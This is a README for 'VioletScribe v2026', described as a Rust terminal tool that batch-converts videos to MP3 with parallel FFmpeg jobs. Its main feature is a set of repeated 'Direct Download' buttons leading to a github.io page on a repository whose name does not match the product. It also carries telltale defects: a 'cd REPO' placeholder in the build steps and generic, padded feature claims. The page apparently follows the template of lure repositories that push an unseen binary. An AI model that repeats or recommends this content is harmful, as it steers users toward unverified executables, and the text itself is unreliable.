# VioletScribe v2026 - batch video-to-MP3 converter 2026

> **VioletScribe is a Rust-based batch video-to-MP3 tool for desktop and terminal workflows, pairing a ratatui interface with parallel FFmpeg processing to turn video collections into audio quickly in version 2026.**

[![Platform](https://img.shields.io/badge/Platform-Rust%20CLI%20desktop-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/fabiangirard72/ccg-app-rust-ffmpeg-processor-win-10462?style=flat-square)](https://github.com/fabiangirard72/ccg-app-rust-ffmpeg-processor-win-10462)

---

<p align="center">
  <a href="https://fabiangirard72.github.io/ccg-app-rust-ffmpeg-processor-win-10462/">
    <img src="https://img.shields.io/badge/Download-VioletScribe%20Latest-brightgreen?style=for-the-badge" alt="Download VioletScribe">
  </a>
</p>

> **[Direct Download - VioletScribe v2026](https://fabiangirard72.github.io/ccg-app-rust-ffmpeg-processor-win-10462/)**

---

[Download Latest Build](https://fabiangirard72.github.io/ccg-app-rust-ffmpeg-processor-win-10462/)

---

## About VioletScribe

VioletScribe is designed for people who need to convert lots of video files into MP3s without babysitting each job one by one. It scans folders recursively, processes media in parallel with FFmpeg, and keeps memory usage steady so it can handle larger queues in a predictable way.

It is especially useful for transcription prep, audio extraction, and batch media cleanup when a simple terminal-based workflow is preferred. The interface is built with ratatui, giving the project a focused command-line desktop feel while still keeping the conversion workflow approachable.

---

## Features

- Recursive directory scanning for nested video libraries
- Parallel FFmpeg conversion for faster batch output
- Up to 25 concurrent workers for high-throughput jobs
- Flat memory usage to keep processing behavior consistent
- Skips files that already have matching MP3 or SRT outputs
- Graceful shutdown support for interrupted sessions
- Plain text fallback for environments without the full TUI experience
- Single static binary for straightforward distribution and launch

---

## Installation

Clone the repository and build the project with Rust:

```bash
git clone https://github.com/fabiangirard72/ccg-app-rust-ffmpeg-processor-win-10462.git
cd REPO
cargo build --release
```

After building, run the generated binary from the release target directory. If you are using a published build, download it and launch the executable directly.

---

## Usage

Point VioletScribe at a folder containing video files and let it scan the directory tree for eligible media. The app will queue conversions, run FFmpeg jobs in parallel, and write MP3 outputs alongside the source content or in the configured destination.

Example workflow:

1. Start the program from the terminal.
2. Choose or provide a source directory.
3. Review the file list discovered by recursive scanning.
4. Begin batch conversion.
5. Let the worker pool process files until completion.

Typical command-line launch:

```bash
./violetscribe
```

If you are preparing files for transcription, run the conversion pass first and then feed the resulting MP3 files into your downstream workflow.

---

## Configuration

VioletScribe is centered around terminal use, so settings are typically managed through the app's runtime options and local preferences. If your build includes a configuration file, keep it near the executable or in the project-defined user settings location.

Example structure:

```toml
[conversion]
workers = 25
skip_existing = true
output_format = "mp3"

[interface]
mode = "tui"
fallback = "plain-text"
```

If a configuration file is not present in your build, use the available launch options and on-screen prompts to control the conversion flow.

---

## Requirements

- Rust toolchain for building from source
- FFmpeg available for audio conversion
- A desktop or terminal environment that can run a CLI application
- Enough storage for source videos and generated MP3 files
- A system capable of handling parallel jobs, especially for larger batches

---

## FAQ

**How do I update VioletScribe?**  
Download the latest build from the project release location or rebuild from the current source tree with Rust.

**Does it support large folder trees?**  
Yes. Recursive scanning is included, so nested directories can be processed in a single batch.

**What if I want to stop a run midway?**  
The tool includes graceful shutdown behavior so it can exit without requiring a hard termination.

**Can I avoid reprocessing files?**  
Yes. Existing MP3 or SRT outputs are skipped when detected.

**Is there a non-TUI fallback?**  
Yes. A plain text fallback is available for simpler terminal environments.

**Where do I change worker count or output behavior?**  
Adjust the runtime settings or configuration used by your build, depending on how the package is distributed.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
